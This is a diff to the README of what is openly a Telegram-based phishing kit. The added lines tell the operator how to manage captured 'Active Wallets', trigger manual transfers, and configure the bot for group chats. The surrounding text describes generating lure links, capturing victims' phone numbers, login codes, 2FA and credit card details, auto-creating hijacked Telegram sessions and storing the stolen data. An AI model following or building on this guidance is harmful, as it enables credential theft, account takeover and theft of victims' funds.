@@ -74,6 +74,8 @@ python3 run.py
   - Send `/start` and enter the password.
   - Generate "Automated" links (shows victim's own info).
   - Generate "Custom" links (shows specific username/pfp/price).
+  - Manage "📁 Active Wallets": Trigger manual transfers or end sessions.
+  - *Note for Groups*: Disable "Bot Privacy Mode" via @BotFather to ensure the bot responds to price/username inputs in group chats.
 - **Data Capture**: Captures Phone Number, Login Code, 2FA, and Credit Card details.
 - **Auto-Login**: If API ID/Hash are provided, the system attempts to create a Telethon session automatically when the code is submitted.
 - **Persistence**: All submissions are saved to `submissions.txt` and sessions are stored in the `sessions/` folder.
